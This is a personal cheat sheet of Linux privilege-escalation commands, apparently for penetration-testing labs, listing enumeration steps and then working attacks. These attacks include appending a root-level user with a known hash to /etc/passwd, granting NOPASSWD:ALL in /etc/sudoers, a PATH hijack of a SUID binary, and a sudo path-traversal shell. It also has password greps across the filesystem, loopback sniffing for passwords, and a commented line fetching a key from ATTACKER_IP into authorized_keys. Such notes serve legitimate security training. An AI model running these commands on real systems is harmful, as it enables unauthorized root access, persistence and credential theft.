~~~Automated Enumeration~~~
./unix-privesc-check standard

~~~Manual Enumeration~~~

#General Enumeration
id      #View current User info
cat /etc/passwd      #View passwd file
hostname      #view system hostname


#OS Version Info
cat   /etc/issue      #os version
cat   /etc/os-release      #
cat /etc/*-release    #
uname -a      #OS Kernel/Architecture Version


#Running Services and Processes
ps aux      #View system processes (including those run by privileged users) 
watch -n 1 "ps -aux | grep pass"    #Run the ps command every second via the watch utility and grep the results on any occurrence of the word "pass"

#Enumerate Network Info
ip a      #List the TCP/IP configuration of every network adapter
ipconfig a      #List the TCP/IP configuration of every network adapter
routel      #View Network routing tables
ss -anp      #Display active network connections and listening ports
netstat -anp    #Display active network connections and listening ports
grep -nRw '8080\|8081' /etc/* 2>/dev/null    #Search recursively through files for references to 8080 & 8081 (ports) to determine their purpose on the server
cat /etc/iptables/rules.v4      #Inspecting custom IP tables


#Scheduled tasks
ls -lah /etc/cron*      #List the contents of all cron directories
cat /etc/crontab      #Viewing /etc/crontab file
crontab -l      #View the current user's scheduled jobs
sudo crontab -l      #Listing cron jobs using sudo reveals jobs run by the root user
grep "CRON" /var/log/syslog    #Inspect the cron log file (/var/log/cron.log) for running cron jobs with write permissions etc.
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root


#Installed applications
dpkg -l      #list applications installed by dpkg on our Debian system


#Find writable Locations
find / -writable -type d 2>/dev/null      #Searching for every directory writable by the current user

#Searching for Files and in Files
find / -name flag.txt    #Search for file by filename
find / -iname flag.txt    #Search for file by filename case insenstive
find /path/to/search -ctime -1    #Find things changed in the last 24 hours
find /path/to/search -user owner    #Find things by it's owner
find / -name *.kdbx 2>/dev/null    #search for files with kdbx extension
grep -R "examplestringtosearch" / -s -n    #Search through each file for a string
grep -rnw '/path/to/somewhere/' -e 'pattern'    'search for the word pattern recursively through files in the somewhere directory

#Disks and Mounts
cat /etc/fstab      #List all mounted filesystems.
mount      #Lists all drives that will be mounted at boot time.
lsblk      #Use lsblk to view all available disks


#Device Drivers and Kernel Modules
lsmod    #Enumerate the loaded kernel modules using lsmod without any additional arguments
/sbin/modinfo libata      #Displaying additional information about the example libata module


#SETUID & SETGID
find / -perm -u=s -type f 2>/dev/null      #search for SUID-marked binaries
find / -perm -1000 -type d 2>/dev/null    #??
find / -perm -g=s -type f 2>/dev/null    #??

#SUID File found but no path defined. In this example the "service" file had the suid bit set but no path defined
####cd /tmp
###touch service
###chmod +x service
###echo "/bin/sh" > service
###export PATH=/tmp:$PATH        ###dd /tmp directory to start of path so it checks there first
###Execute the SUID file from within the /tmp directory 


#User Information
env    #Sometimes administrators store credentials inside environment variables
cat .bashrc    #Inspect .bashrc file for custom env variables


#SU
su - root    #Try to su as root 


#Sudo
sudo --version    #Check version for exploits
sudo -l    #Sudo capabilities of current user
sudo -i    #Elevate directly to root by running i with sudo and supplying eve's or other admins credentials.
echo targetUser ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers
kali@kali:~$ sudo -u steven /usr/sbin/service ../../../bin/sh    #Use sudo -u to run /service or other command as different user if other user has "nopasswd sudo rights" on the /service or other file

#TcpDump to Inspect Traffic (cannot be run without sudo permissions)
#sudo tcpdump -i lo -A | grep "pass"    #capture traffic in and out of the loopback interface, dump its content in ASCII using  -A parameter. Filter traffic for the word "pass"


#Writing to /etc/passwd
openssl passwd w00t    #Create a password -> $1$rPTJ2Aqi$ZJSECPu2I/HdZsHrui68k.
echo 'root2:$1$rPTJ2Aqi$ZJSECPu2I/HdZsHrui68k.:0:0:root:/root:/bin/bash' >> /etc/passwd    #Create new user in passwd file using created password
su root2      #Elevate Privs with su


#Overwriting SSH id_rsa/authorized keys
#ssh-keygen -t rsa             #Create SSH RSA key pair
#ssh-keygen -b 2048 -t rsa     #Use -b flag to specify key length
#ssh-keygen -t rsa -b 4096 -C "your_email@example.com"  #Use -C flag to specify email 
#ssh-keygen -t ed25519 -C "your_email@example.com"    #Sampe using command using Ed25519 algorithm, required formore recent systems
#echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys    #Add public key to authorized keys


#Setuid, Linux Capabilities and GTFO Bins
/usr/sbin/getcap -r / 2>/dev/null    #Manually Enumerating Linux Capabilities for setuid capabilities enabled, along with the +ep flag specifying that capabilities are effective and permitted.

#search for files that contain the string “passw” and “pwd” across the entire filesystem
grep --color=auto -rnw '/' -iIe "PASSW\|PASSWD\|PASSWORD\|PWD" --color=always 2>/dev/null  #Recursively grep from root directory
grep --color=auto -rnw -iIe "PASSW\|PASSWD\|PASSWORD\|PWD" --color=always 2>/dev/null    Recursively grep from current directory (less output)



